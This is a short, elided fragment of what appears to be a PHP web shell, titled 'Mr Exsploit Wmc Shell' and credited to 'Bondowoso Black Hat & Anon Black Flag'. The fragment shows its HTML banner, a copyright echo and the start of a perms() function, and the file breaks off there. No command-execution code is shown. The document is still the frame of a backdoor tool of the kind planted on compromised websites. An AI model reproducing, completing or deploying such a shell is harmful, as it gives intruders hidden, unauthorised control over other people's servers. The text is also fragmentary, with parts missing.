...
<html>
<head>
<title>Mr Exsploit Wmc Shell</title>
...
<a href="?"><h1 style="font-family: Kelly Slab; font-size: 35px; color: white;">Mr Exsploit Wmc Shell</h1></a> 
<center><b><font face="Courier New" color="white" size="5">[+] Anoon Black Flag Shell [+]</font></b></center>
<BODY>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px #00FAFF, 0 0 5px #00FAFF, 0 0 7px red, 0 0 45px #00FAFF; font-weight:bold: white; font-size:15px">Copyright &copy;2017 || Bondowoso Black Hat & Anon Black Flag</center>
</body>
</html>';
function perms($file){
